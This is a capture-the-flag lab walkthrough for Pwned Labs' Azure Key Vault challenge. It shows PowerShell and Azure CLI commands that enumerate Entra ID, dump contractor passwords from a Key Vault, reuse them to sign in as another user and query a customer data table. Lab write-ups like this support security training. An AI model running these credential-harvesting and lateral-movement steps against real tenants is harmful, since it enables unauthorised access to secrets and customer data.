https://pwnedlabs.io/labs/unlock-access-with-azure-key-vault

With the creds from `PwndLabs/Azure/Azure Blob Container to Initial Access` lab, update `$profile` to enable Azure CLI auto completion:

```bash
sudo mkdir /root/.config/powershell
sudo touch /root/.config/powershell/Microsoft.PowerShell_profile.ps1
sudo nano /root/.config/powershell/Microsoft.PowerShell_profile.ps1
```

Content for `Microsoft.PowerShell_profile.ps1`
```
Register-ArgumentCompleter -Native -CommandName az -ScriptBlock {
    param($commandName, $wordToComplete, $cursorPosition)
    $completion_file = New-TemporaryFile
    $env:ARGCOMPLETE_USE_TEMPFILES = 1
    $env:_ARGCOMPLETE_STDOUT_FILENAME = $completion_file
    $env:COMP_LINE = $wordToComplete
    $env:COMP_POINT = $cursorPosition
    $env:_ARGCOMPLETE = 1
    $env:_ARGCOMPLETE_SUPPRESS_SPACE = 0
    $env:_ARGCOMPLETE_IFS = "`n"
    $env:_ARGCOMPLETE_SHELL = 'powershell'
    az 2>&1 | Out-Null
    Get-Content $completion_file | Sort-Object | ForEach-Object {
        [System.Management.Automation.CompletionResult]::new($_, $_, "ParameterValue", $_)
    }
    Remove-Item $completion_file, Env:\_ARGCOMPLETE_STDOUT_FILENAME, Env:\ARGCOMPLETE_USE_TEMPFILES, Env:\COMP_LINE, Env:\COMP_POINT, Env:\_ARGCOMPLETE, Env:\_ARGCOMPLETE_SUPPRESS_SPACE, Env:\_ARGCOMPLETE_IFS, Env:\_ARGCOMPLETE_SHELL
}
```

Now run `Set-PSReadlineKeyHandler -Key Tab -Function MenuComplete` to enable auto complete.

To attack, log in using the provided creds:

```PowerShell
az login --use-device-code
	To sign in, use a web browser to open the page https://login.microsoft.com/device and enter the code FUSVFSPZ6 to authenticate.
```

After authenticating in the web page that opens, we confirm with `az account show` that we are in the execution context of the user `email@domain.com` . We also see the tenant ID `XXXXX-XXX-XXX-XXX-XXXXXXXXXXXX` and subscription ID `XXXXX-XXX-XXX-XXX-XXXXXXXXXXXX`.

Run the below commands to get a Microsoft Graph session:

```PowerShell
Install-Module Microsoft.Graph
Import-Module Microsoft.Graph.Users
Connect-MgGraph -UseDeviceAuthentication
Install-Module Az
Import-Module Az
Connect-AzAccount
```

Confirm user:

```PowerShell
Get-MgContext

az ad signed-in-user show
```

Get Group Membership for the user:

```PowerShell
Get-MgUserMemberOf -userid "email@domain.com" | select * -ExpandProperty additionalProperties | Select-Object {$_.AdditionalProperties["displayName"]}
	Directory Readers
```

`Directory Readers` allows us to enumerate Entra ID:

```PowerShell
# Given subscription ID
$CurrentSubscriptionID = "XXXXX-XXX-XXX-XXX-XXXXXXXXXXXX"

# Set output format
$OutputFormat = "table"

# Set the given subscription as the active one
& az account set --subscription $CurrentSubscriptionID

# List resources in the current subscription
& az resource list -o $OutputFormat
	ext-contractors	                 	Mircrosoft.KeyVault/vaults
```

We see the Azure Key Vault named `ext-contractors`. Azure Key Vault is a centralized cloud service for securely managing secrets, encryption keys, and certificates.
	We could also enumerate resources via Azure Portal: `https://portal.azure.com/ > All resources > ext-contractors > Objects > Secrets`

To list Secrets and Keys inside the `ext-contractors` vault from PowerShell:

```PowerShell
# Set variables
$VaultName = "ext-contractors"

# Set the current Azure subscription
$SubscriptionID = "XXXXX-XXX-XXX-XXX-XXXXXXXXXXXX"
az account set --subscription $SubscriptionID

# List and store the secrets
$secretsJson = az keyvault secret list --vault-name $VaultName -o json
$secrets = $secretsJson | ConvertFrom-Json

# List and store the keys
$keysJson = az keyvault key list --vault-name $VaultName -o json
$keys = $keysJson | ConvertFrom-Json

# Output the secrets
Write-Host "Secrets in vault $VaultName"
foreach ($secret in $secrets) {
    Write-Host $secret.id
}

# Output the keys
Write-Host "Keys in vault $VaultName"
foreach ($key in $keys) {
    Write-Host $key.id
}
```

To list the contents of the Secrets in the `ext-contractors` vault from PowerShell:

```PowerShell
# Set variables
$VaultName = "ext-contractors"
$SecretNames = @("alissa-suarez", "josh-harvey", "ryan-garcia")

# Set the current Azure subscription
$SubscriptionID = "XXXXX-XXX-XXX-XXX-XXXXXXXXXXXX"
az account set --subscription $SubscriptionID

# Retrieve and output the secret values
Write-Host "Secret Values from vault $VaultName"
foreach ($SecretName in $SecretNames) {
    $secretValueJson = az keyvault secret show --name $SecretName --vault-name $VaultName -o json
    $secretValue = ($secretValueJson | ConvertFrom-Json).value
    Write-Host "$SecretName - $secretValue"
}
```

Match the usernames to Entra ID users:

```bash
az ad user list --query "[?givenName=='Alissa' || givenName=='Josh' || givenName=='Ryan'].{Name:displayName, UPN:userPrincipalName, JobTitle:jobTitle}" -o table
	Josh
```

Continue to enumerate Josh from Marcus' access:

```PowerShell
Get-MgUser -UserId ext.josh.harvey@megabigtech.com
	Id
```

Get Membership of the Object Id:

```PowerShell
$UserId = 'XXXXX-XXX-XXX-XXX-XXXXXXXXXXXX'
Get-MgUserMemberOf -userid $userid | select * -ExpandProperty additionalProperties | Select-Object {$_.AdditionalProperties["displayName"]}
	CUSTOMER-DATABASE-ACCESS
```

Navigating to this group in Azure Portal, we can see that members of this group can access the Mega Big Tech customer list and that it's a security group, which means that the group can be assigned permissions.

We also take note of the group objectID, `XXXXX-XXX-XXX-XXX-XXXXXXXXXXXX` .

Enumerate the permissions assigned:

```PowerShell
Get-AzRoleAssignment -Scope "/subscriptions/XXXXX-XXX-XXX-XXX-XXXXXXXXXXXX" | Select-Object DisplayName, RoleDefinitionName

# OR

az role assignment list --scope "/subscriptions/XXXXX-XXX-XXX-XXX-XXXXXXXXXXXX" --output json
```

No permissions, let's try using Josh's creds we found. Re-authenticate and enumerate:

```PowerShell
az logout
az login --use-device-authentication

Disconnect-MgGraph
Connect-MgGraph -UseDeviceAuthentication
```

Get Josh's Role Assignments:

```PowerShell
Get-AzRoleAssignment -Scope "/subscriptions/XXXXX-XXX-XXX-XXX-XXXXXXXXXXXX" | Select-Object DisplayName, RoleDefinitionName

az role definition list --custom-role-only true --query "[?roleName=='Customer Database Access']" -o json
```

This shows that the group gives members the ability to list storage tables and their values! Azure Storage Tables are a NoSQL data store used for storing large amounts of structured, non-relational data. They are a part of the Azure Storage services, alongside Blob Storage, File Storage, and Queue Storage.

Now, list the storage accounts in the account:

```bash
az storage account list --query "[].name" -o tsv
	custdatabase
```

See if nay storage tables exist in the `custdatabase`:

```bash
az storage table list --account-name custdatabase --output table --auth-mode login
	customers
```

Query the storage table:

```bash
az storage entity query --table-name customers --account-name custdatabase --output table --auth-mode login
	FLAG
```